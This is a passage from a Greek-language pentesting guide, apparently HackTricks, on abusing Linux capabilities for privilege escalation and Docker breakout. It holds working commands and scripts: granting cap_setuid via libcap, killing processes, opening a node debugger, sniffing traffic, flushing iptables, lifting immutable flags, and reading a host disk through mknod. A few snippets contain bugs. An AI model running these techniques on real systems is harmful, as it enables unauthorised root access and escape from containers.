libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> Σημειώστε ότι αν ορίσετε μια νέα ικανότητα στο δυαδικό αρχείο με CAP_SETFCAP, θα χάσετε αυτή την ικανότητα.

Μόλις έχετε [SETUID capability](linux-capabilities.md#cap_setuid) μπορείτε να μεταβείτε στην ενότητα του για να δείτε πώς να κλιμακώσετε τα δικαιώματα.

**Παράδειγμα με περιβάλλον (Docker breakout)**

Από προεπιλογή, η ικανότητα **CAP_SETFCAP δίνεται στη διαδικασία μέσα στο κοντέινερ στο Docker**. Μπορείτε να το ελέγξετε κάνοντας κάτι όπως:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Αυτή η δυνατότητα επιτρέπει να **δώσουμε οποιαδήποτε άλλη δυνατότητα σε δυαδικά αρχεία**, οπότε θα μπορούσαμε να σκεφτούμε για **διαφυγή** από το κοντέινερ **καταχρώντας οποιαδήποτε από τις άλλες δυνατότητες διαφυγής** που αναφέρονται σε αυτή τη σελίδα.\
Ωστόσο, αν προσπαθήσετε να δώσετε για παράδειγμα τις δυνατότητες CAP_SYS_ADMIN και CAP_SYS_PTRACE στο δυαδικό αρχείο gdb, θα διαπιστώσετε ότι μπορείτε να τις δώσετε, αλλά το **δυαδικό αρχείο δεν θα μπορεί να εκτελεστεί μετά από αυτό**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[Από τα έγγραφα](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: Αυτό είναι ένα **περιοριστικό υπερσύνολο για τις αποτελεσματικές ικανότητες** που μπορεί να αναλάβει το νήμα. Είναι επίσης ένα περιοριστικό υπερσύνολο για τις ικανότητες που μπορεί να προστεθούν στο κληρονομούμενο σύνολο από ένα νήμα που **δεν έχει την ικανότητα CAP_SETPCAP** στο αποτελεσματικό του σύνολο._\
Φαίνεται ότι οι επιτρεπόμενες ικανότητες περιορίζουν αυτές που μπορούν να χρησιμοποιηθούν.\
Ωστόσο, το Docker παρέχει επίσης την **CAP_SETPCAP** από προεπιλογή, οπότε μπορεί να είστε σε θέση να **ορίσετε νέες ικανότητες μέσα στις κληρονομούμενες**.\
Ωστόσο, στην τεκμηρίωση αυτής της ικανότητας: _CAP_SETPCAP : \[…] **προσθέτει οποιαδήποτε ικανότητα από το περιοριστικό σύνολο του καλούντος νήματος** στο κληρονομούμενο σύνολο_.\
Φαίνεται ότι μπορούμε να προσθέσουμε μόνο στο κληρονομούμενο σύνολο ικανότητες από το περιοριστικό σύνολο. Αυτό σημαίνει ότι **δεν μπορούμε να βάλουμε νέες ικανότητες όπως CAP_SYS_ADMIN ή CAP_SYS_PTRACE στο κληρονομούμενο σύνολο για να κλιμακώσουμε προνόμια**.

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) παρέχει μια σειρά από ευαίσθητες λειτουργίες, συμπεριλαμβανομένης της πρόσβασης σε `/dev/mem`, `/dev/kmem` ή `/proc/kcore`, τροποποίηση `mmap_min_addr`, πρόσβαση σε `ioperm(2)` και `iopl(2)` συστήματα κλήσεων, και διάφορες εντολές δίσκου. Η `FIBMAP ioctl(2)` είναι επίσης ενεργοποιημένη μέσω αυτής της ικανότητας, η οποία έχει προκαλέσει προβλήματα στο [παρελθόν](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Σύμφωνα με τη σελίδα man, αυτό επιτρέπει επίσης στον κάτοχο να περιγραφικά `εκτελεί μια σειρά από ειδικές για τη συσκευή λειτουργίες σε άλλες συσκευές`.

Αυτό μπορεί να είναι χρήσιμο για **κλιμάκωση προνομίων** και **breakout Docker.**

## CAP_KILL

**Αυτό σημαίνει ότι είναι δυνατό να σκοτώσετε οποιαδήποτε διαδικασία.**

**Παράδειγμα με δυαδικό**

Ας υποθέσουμε ότι το **`python`** δυαδικό έχει αυτή την ικανότητα. Αν μπορούσατε **επίσης να τροποποιήσετε κάποια υπηρεσία ή ρύθμιση υποδοχής** (ή οποιοδήποτε αρχείο ρύθμισης που σχετίζεται με μια υπηρεσία), θα μπορούσατε να το backdoor, και στη συνέχεια να σκοτώσετε τη διαδικασία που σχετίζεται με αυτή την υπηρεσία και να περιμένετε να εκτελεστεί το νέο αρχείο ρύθμισης με το backdoor σας.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc με kill**

Αν έχετε δυνατότητες kill και υπάρχει ένα **πρόγραμμα node που τρέχει ως root** (ή ως διαφορετικός χρήστης) μπορείτε πιθανώς να **στείλετε** το **σήμα SIGUSR1** και να το κάνετε να **ανοίξει τον debugger του node** ώστε να μπορείτε να συνδεθείτε.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Αυτό σημαίνει ότι είναι δυνατό να ακούσετε σε οποιαδήποτε θύρα (ακόμα και σε προνομιούχες).** Δεν μπορείτε να αναβαθμίσετε τα προνόμια άμεσα με αυτή την ικανότητα.

**Παράδειγμα με δυαδικό αρχείο**

Αν **`python`** έχει αυτή την ικανότητα, θα μπορεί να ακούει σε οποιαδήποτε θύρα και ακόμη και να συνδέεται από αυτή σε οποιαδήποτε άλλη θύρα (ορισμένες υπηρεσίες απαιτούν συνδέσεις από συγκεκριμένες προνομιούχες θύρες)

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ικανότητα επιτρέπει στις διαδικασίες να **δημιουργούν RAW και PACKET sockets**, επιτρέποντάς τους να παράγουν και να στέλνουν αυθαίρετα πακέτα δικτύου. Αυτό μπορεί να οδηγήσει σε κινδύνους ασφαλείας σε κοντεϊνεροποιημένα περιβάλλοντα, όπως η παραχάραξη πακέτων, η έγχυση κυκλοφορίας και η παράκαμψη ελέγχων πρόσβασης δικτύου. Κακόβουλοι παράγοντες θα μπορούσαν να εκμεταλλευτούν αυτό για να παρεμβαίνουν στη δρομολόγηση κοντεϊνερ ή να διακυβεύσουν την ασφάλεια του δικτύου του κεντρικού υπολογιστή, ειδικά χωρίς επαρκείς προστασίες τείχους προστασίας. Επιπλέον, **CAP_NET_RAW** είναι κρίσιμη για τα προνομιούχα κοντέινερ ώστε να υποστηρίζουν λειτουργίες όπως το ping μέσω RAW ICMP αιτημάτων.

**Αυτό σημαίνει ότι είναι δυνατόν να καταγράψετε την κυκλοφορία.** Δεν μπορείτε να αναβαθμίσετε τα προνόμια άμεσα με αυτή την ικανότητα.

**Παράδειγμα με δυαδικό αρχείο**

Αν το δυαδικό αρχείο **`tcpdump`** έχει αυτή την ικανότητα, θα μπορείτε να το χρησιμοποιήσετε για να καταγράψετε πληροφορίες δικτύου.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Σημειώστε ότι αν το **environment** παρέχει αυτή την ικανότητα, μπορείτε επίσης να χρησιμοποιήσετε **`tcpdump`** για να καταγράψετε την κίνηση.

**Παράδειγμα με δυαδικό 2**

Το παρακάτω παράδειγμα είναι **`python2`** κώδικας που μπορεί να είναι χρήσιμος για να παγιδεύσει την κίνηση της διεπαφής "**lo**" (**localhost**). Ο κώδικας προέρχεται από το εργαστήριο "_The Basics: CAP-NET_BIND + NET_RAW_" από [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ικανότητα δίνει στον κάτοχο τη δύναμη να **αλλάξει τις ρυθμίσεις δικτύου**, συμπεριλαμβανομένων των ρυθμίσεων τείχους προστασίας, των πινάκων δρομολόγησης, των αδειών υποδοχών και των ρυθμίσεων διεπαφής δικτύου εντός των εκτεθειμένων namespaces δικτύου. Επίσης, επιτρέπει την ενεργοποίηση του **promiscuous mode** στις διεπαφές δικτύου, επιτρέποντας την παρακολούθηση πακέτων σε διάφορα namespaces.

**Παράδειγμα με δυαδικό**

Ας υποθέσουμε ότι το **python binary** έχει αυτές τις ικανότητες.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**Αυτό σημαίνει ότι είναι δυνατή η τροποποίηση των χαρακτηριστικών inode.** Δεν μπορείτε να αναβαθμίσετε τα δικαιώματα άμεσα με αυτή την ικανότητα.

**Παράδειγμα με δυαδικό αρχείο**

Αν διαπιστώσετε ότι ένα αρχείο είναι αμετάβλητο και η python έχει αυτή την ικανότητα, μπορείτε να **αφαιρέσετε το χαρακτηριστικό αμεταβλητότητας και να κάνετε το αρχείο τροποποιήσιμο:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
> [!NOTE]
> Σημειώστε ότι συνήθως αυτό το αμετάβλητο χαρακτηριστικό ρυθμίζεται και αφαιρείται χρησιμοποιώντας:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) επιτρέπει την εκτέλεση της κλήσης συστήματος `chroot(2)`, η οποία μπορεί δυνητικά να επιτρέψει την έξοδο από περιβάλλοντα `chroot(2)` μέσω γνωστών ευπαθειών:

- [Πώς να σπάσετε διάφορες λύσεις chroot](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [chw00t: εργαλείο εξόδου chroot](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) όχι μόνο επιτρέπει την εκτέλεση της κλήσης συστήματος `reboot(2)` για επανεκκινήσεις συστήματος, συμπεριλαμβανομένων συγκεκριμένων εντολών όπως `LINUX_REBOOT_CMD_RESTART2` προσαρμοσμένων για ορισμένες πλατφόρμες υλικού, αλλά επιτρέπει επίσης τη χρήση των `kexec_load(2)` και, από το Linux 3.17 και μετά, `kexec_file_load(2)` για τη φόρτωση νέων ή υπογεγραμμένων πυρήνων σφαλμάτων αντίστοιχα.

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) διαχωρίστηκε από το ευρύτερο **CAP_SYS_ADMIN** στο Linux 2.6.37, παρέχοντας συγκεκριμένα τη δυνατότητα χρήσης της κλήσης `syslog(2)`. Αυτή η ικανότητα επιτρέπει την προβολή διευθύνσεων πυρήνα μέσω του `/proc` και παρόμοιων διεπαφών όταν η ρύθμιση `kptr_restrict` είναι στο 1, η οποία ελέγχει την έκθεση διευθύνσεων πυρήνα. Από το Linux 2.6.39, η προεπιλογή για το `kptr_restrict` είναι 0, που σημαίνει ότι οι διευθύνσεις πυρήνα είναι εκτεθειμένες, αν και πολλές διανομές το ρυθμίζουν σε 1 (κρύβουν διευθύνσεις εκτός από τον uid 0) ή 2 (πάντα κρύβουν διευθύνσεις) για λόγους ασφαλείας.

Επιπλέον, το **CAP_SYSLOG** επιτρέπει την πρόσβαση στην έξοδο `dmesg` όταν το `dmesg_restrict` είναι ρυθμισμένο σε 1. Παρά αυτές τις αλλαγές, το **CAP_SYS_ADMIN** διατηρεί τη δυνατότητα εκτέλεσης λειτουργιών `syslog` λόγω ιστορικών προηγούμενων.

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) επεκτείνει τη λειτουργικότητα της κλήσης συστήματος `mknod` πέρα από τη δημιουργία κανονικών αρχείων, FIFOs (ονομασμένες σωλήνες) ή υποδοχών τομέα UNIX. Επιτρέπει συγκεκριμένα τη δημιουργία ειδικών αρχείων, τα οποία περιλαμβάνουν:

- **S_IFCHR**: Ειδικά αρχεία χαρακτήρων, τα οποία είναι συσκευές όπως τερματικά.
- **S_IFBLK**: Ειδικά αρχεία μπλοκ, τα οποία είναι συσκευές όπως δίσκοι.

Αυτή η ικανότητα είναι απαραίτητη για διαδικασίες που απαιτούν τη δυνατότητα δημιουργίας αρχείων συσκευών, διευκολύνοντας την άμεση αλληλεπίδραση με το υλικό μέσω χαρακτήρων ή μπλοκ συσκευών.

Είναι μια προεπιλεγμένη ικανότητα docker ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Αυτή η ικανότητα επιτρέπει την εκτέλεση αναβάθμισης δικαιωμάτων (μέσω πλήρους ανάγνωσης δίσκου) στον οικοδεσπότη, υπό αυτές τις συνθήκες:

1. Έχετε αρχική πρόσβαση στον οικοδεσπότη (χωρίς δικαιώματα).
2. Έχετε αρχική πρόσβαση στο κοντέινερ (με δικαιώματα (EUID 0), και αποτελεσματικό `CAP_MKNOD`).
3. Ο οικοδεσπότης και το κοντέινερ θα πρέπει να μοιράζονται το ίδιο namespace χρηστών.

**Βήματα για τη Δημιουργία και Πρόσβαση σε μια Συσκευή Μπλοκ σε Ένα Κοντέινερ:**

1. **Στον Οικοδεσπότη ως Κανονικός Χρήστης:**

- Προσδιορίστε το τρέχον αναγνωριστικό χρήστη σας με `id`, π.χ., `uid=1000(standarduser)`.
- Προσδιορίστε τη στοχευμένη συσκευή, για παράδειγμα, `/dev/sdb`.

2. **Μέσα στο Κοντέινερ ως `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Επιστροφή στον Φιλοξενούμενο:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Αυτή η προσέγγιση επιτρέπει στον τυπικό χρήστη να έχει πρόσβαση και ενδεχομένως να διαβάσει δεδομένα από το `/dev/sdb` μέσω του κοντέινερ, εκμεταλλευόμενος τα κοινά namespaces χρηστών και τις άδειες που έχουν οριστεί στη συσκευή.

### CAP_SETPCAP

**CAP_SETPCAP** επιτρέπει σε μια διαδικασία να **αλλάξει τα σύνολα ικανοτήτων** μιας άλλης διαδικασίας, επιτρέποντας την προσθήκη ή την αφαίρεση ικανοτήτων από τα αποτελεσματικά, κληρονομούμενα και επιτρεπόμενα σύνολα. Ωστόσο, μια διαδικασία μπορεί να τροποποιήσει μόνο τις ικανότητες που κατέχει στο δικό της επιτρεπόμενο σύνολο, διασφαλίζοντας ότι δεν μπορεί να ανυψώσει τα προνόμια μιας άλλης διαδικασίας πέρα από τα δικά της. Οι πρόσφατες ενημερώσεις του πυρήνα έχουν σφίξει αυτούς τους κανόνες, περιορίζοντας το `CAP_SETPCAP` ώστε να μειώνει μόνο τις ικανότητες εντός του δικού του ή των κληρονομούμενων επιτρεπόμενων συνόλων, με στόχο τη μείωση των κινδύνων ασφαλείας. Η χρήση απαιτεί να έχετε το `CAP_SETPCAP` στο αποτελεσματικό σύνολο και τις στοχευμένες ικανότητες στο επιτρεπόμενο σύνολο, χρησιμοποιώντας το `capset()` για τροποποιήσεις. Αυτό συνοψίζει τη βασική λειτουργία και τους περιορισμούς του `CAP_SETPCAP`, επισημαίνοντας τον ρόλο του στη διαχείριση προνομίων και την ενίσχυση της ασφάλειας.

**`CAP_SETPCAP`** είναι μια ικανότητα του Linux που επιτρέπει σε μια διαδικασία να **τροποποιήσει τα σύνολα ικανοτήτων μιας άλλης διαδικασίας**. Παρέχει τη δυνατότητα προσθήκης ή αφαίρεσης ικανοτήτων από τα αποτελεσματικά, κληρονομούμενα και επιτρεπόμενα σύνολα ικανοτήτων άλλων διαδικασιών. Ωστόσο, υπάρχουν ορισμένοι περιορισμοί σχετικά με το πώς μπορεί να χρησιμοποιηθεί αυτή η ικανότητα.

Μια διαδικασία με `CAP_SETPCAP` **μπορεί να χορηγήσει ή να αφαιρέσει ικανότητες που βρίσκονται στο δικό της επιτρεπόμενο σύνολο ικανοτήτων**. Με άλλα λόγια, μια διαδικασία δεν μπορεί να χορηγήσει μια ικανότητα σε μια άλλη διαδικασία αν δεν έχει αυτή την ικανότητα η ίδια. Αυτός ο περιορισμός αποτρέπει μια διαδικασία από το να ανυψώσει τα προνόμια μιας άλλης διαδικασίας πέρα από το δικό της επίπεδο προνομίων.

Επιπλέον, σε πρόσφατες εκδόσεις του πυρήνα, η ικανότητα `CAP_SETPCAP` έχει **περιοριστεί περαιτέρω**. Δεν επιτρέπει πλέον σε μια διαδικασία να τροποποιεί αυθαίρετα τα σύνολα ικανοτήτων άλλων διαδικασιών. Αντίθετα, **επιτρέπει μόνο σε μια διαδικασία να μειώσει τις ικανότητες στο δικό της επιτρεπόμενο σύνολο ικανοτήτων ή στο επιτρεπόμενο σύνολο ικανοτήτων των κληρονόμων της**. Αυτή η αλλαγή εισήχθη για να μειώσει τους πιθανούς κινδύνους ασφαλείας που σχετίζονται με την ικανότητα.

Για να χρησιμοποιήσετε το `CAP_SETPCAP` αποτελεσματικά, πρέπει να έχετε την ικανότητα στο αποτελεσματικό σας σύνολο ικανοτήτων και τις στοχευμένες ικανότητες στο επιτρεπόμενο σύνολο ικανοτήτων σας. Μπορείτε στη συνέχεια να χρησιμοποιήσετε την κλήση συστήματος `capset()` για να τροποποιήσετε τα σύνολα ικανοτήτων άλλων διαδικασιών.

Συνοψίζοντας, το `CAP_SETPCAP` επιτρέπει σε μια διαδικασία να τροποποιήσει τα σύνολα ικανοτήτων άλλων διαδικασιών, αλλά δεν μπορεί να χορηγήσει ικανότητες που δεν έχει η ίδια. Επιπλέον, λόγω ανησυχιών ασφαλείας, η λειτουργικότητά του έχει περιοριστεί σε πρόσφατες εκδόσεις του πυρήνα ώστε να επιτρέπει μόνο τη μείωση των ικανοτήτων στο δικό του επιτρεπόμενο σύνολο ικανοτήτων ή στα επιτρεπόμενα σύνολα ικανοτήτων των κληρονόμων του.

## Αναφορές

**Οι περισσότερες από αυτές τις παραδείγματα προήλθαν από κάποια εργαστήρια του** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), οπότε αν θέλετε να εξασκηθείτε σε αυτές τις τεχνικές privesc, προτείνω αυτά τα εργαστήρια.

**Άλλες αναφορές**:

- [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
- [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​
{{#include ../../banners/hacktricks-training.md}}
